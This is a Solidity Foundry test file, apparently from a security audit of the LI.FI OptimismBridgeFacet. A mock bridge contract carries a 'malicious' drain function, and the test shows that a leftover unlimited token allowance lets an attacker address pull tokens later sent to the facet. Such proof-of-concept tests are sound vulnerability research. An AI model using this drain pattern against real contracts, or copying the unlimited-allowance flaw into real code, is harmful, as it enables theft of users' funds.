// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import {Test} from "forge-std/Test.sol";
import {MockERC20} from "solmate/test/utils/mocks/MockERC20.sol";
import {OptimismBridgeFacet} from "lifi/Facets/OptimismBridgeFacet.sol";
import {IL1StandardBridge} from "lifi/Interfaces/IL1StandardBridge.sol";
import {ILiFi} from "lifi/Interfaces/ILiFi.sol";
import {LibDiamond} from "lifi/Libraries/LibDiamond.sol";

contract MockStandardBridge is IL1StandardBridge {
    address public token;

    constructor(address _token) {
        token = _token;
    }

    function depositETHTo(address, uint32, bytes calldata) external payable override {}

    function depositERC20To(
        address,
        address,
        address,
        uint256 amount,
        uint32,
        bytes calldata
    ) external override {
        MockERC20(token).transferFrom(msg.sender, address(this), amount);
    }

    function depositTo(address, uint256 amount) external override {
        MockERC20(token).transferFrom(msg.sender, address(this), amount);
    }

    // malicious helper to drain leftover allowance
    function drain(address from, address to, uint256 amount) external {
        MockERC20(token).transferFrom(from, to, amount);
    }
}

contract TestOptimismFacet is OptimismBridgeFacet {
    function initOwner() external {
        LibDiamond.setContractOwner(msg.sender);
    }
}

contract OptimismBridgeFacetAllowanceTest is Test {
    MockERC20 internal token;
    MockStandardBridge internal bridge;
    TestOptimismFacet internal facet;
    address internal attacker = address(0xbeef);

    function setUp() public {
        token = new MockERC20("Mock", "MOCK", 18);
        bridge = new MockStandardBridge(address(token));
        facet = new TestOptimismFacet();
        facet.initOwner();
        OptimismBridgeFacet.Config[] memory configs = new OptimismBridgeFacet.Config[](0);
        facet.initOptimism(configs, IL1StandardBridge(address(bridge)));

        token.mint(address(this), 100 ether);
        token.approve(address(facet), type(uint256).max);
    }

    function test_UnlimitedAllowanceAllowsTokenDrain() public {
        ILiFi.BridgeData memory bridgeData = ILiFi.BridgeData({
            transactionId: bytes32("tx"),
            bridge: "",
            integrator: "",
            referrer: address(0),
            sendingAssetId: address(token),
            receiver: address(0x1234),
            minAmount: 10 ether,
            destinationChainId: 10,
            hasSourceSwaps: false,
            hasDestinationCall: false
        });

        OptimismBridgeFacet.OptimismData memory optimism = OptimismBridgeFacet.OptimismData({
            assetIdOnL2: address(0x5678),
            l2Gas: 0,
            isSynthetix: false
        });

        facet.startBridgeTokensViaOptimismBridge(bridgeData, optimism);

        // allowance should remain max
        assertEq(token.allowance(address(facet), address(bridge)), type(uint256).max);

        // attacker drains tokens sent later to facet
        token.mint(address(facet), 5 ether);
        bridge.drain(address(facet), attacker, 5 ether);

        assertEq(token.balanceOf(attacker), 5 ether);
    }
}

